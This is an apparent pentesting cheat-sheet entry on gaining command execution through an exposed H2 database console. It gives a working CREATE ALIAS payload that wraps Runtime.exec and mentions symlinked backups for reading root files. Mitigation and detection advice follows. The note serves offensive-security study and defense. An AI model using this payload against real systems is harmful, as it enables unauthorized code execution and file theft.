---
topic: H2 — console, Java aliases and backup
tags: [linux, h2, java, database, rce, symlink]
---

# H2 — console, Java aliases and backup

**English** | [🌐 Español](h2-database-alias-rce.md)

## Concept

An exposed H2 console runs SQL as the process user. `CREATE ALIAS` can define a Java function calling `Runtime.exec`, and H2's backup can follow symlinks and copy root files.

## When it applies

- The H2 console is reachable (directly or via tunnel).
- The process runs as root or a privileged user.
- Login is possible or a database can be created.

## Procedure

1. Access the console and authenticate.
2. Create an alias with Java code.
3. Call the alias to run commands.
4. Alternatively, create a `.trace.db` symlink and download the backup.

## Commands

```bash
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; } $$;
CALL SHELLEXEC('id');
```

## Variants

- `RUNSCRIPT` to load SQL.
- `CSVREAD` to read files.
- `t.trace.db` symlink and backup ZIP.

## Limitations

- The console may be localhost-only.
- A password or a new database is needed.
- The process may not be root.

## Mitigation

- Do not expose the H2 console.
- Run H2 unprivileged with a password.
- Disallow `CREATE ALIAS` and symlink backups.

## Detection

- `CREATE ALIAS` or `RUNSCRIPT` queries.
- Connections to 8082 from unusual hosts.
- Backups reading `/root` or following symlinks.

## References

- [0xdf — Hawk](https://0xdf.gitlab.io/2018/11/30/htb-hawk.html)
- [H2 — CREATE ALIAS](https://h2database.com/html/commands.html#create_alias)
- [HackTricks — H2](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/h2-database.html)
